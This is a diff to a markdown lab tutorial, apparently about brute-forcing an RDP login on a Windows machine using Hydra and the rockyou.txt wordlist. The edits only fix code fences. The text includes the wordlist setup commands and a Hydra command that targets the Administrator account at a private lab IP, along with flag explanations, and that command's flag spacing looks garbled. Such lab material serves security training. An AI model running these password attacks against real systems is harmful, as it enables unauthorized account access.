@@ -34,8 +34,7 @@ sudo apt update && sudo apt install wordlists -y
 # Extract the rockyou.txt.gz file
 cd /usr/share/wordlists/
 sudo gunzip rockyou.txt.gz
-
-
+```
 ### Phase 3 : Executing the BruteForce Attack
 1. From the Kali Linux terminal, launch Hydra
 against the target Windows machine using the
@@ -45,7 +44,7 @@ unzipped wordlist :
 ```bash
 hydra -t 4-V-l Administrator -P /usr/share/
 wordlists/rockyou.txt rdp://192.168.232.131
-
+```
 • -t 4 : Sets parallel tasks to 4.
 • -V : Enables verbose mode to display username & password combinations in real
 time.
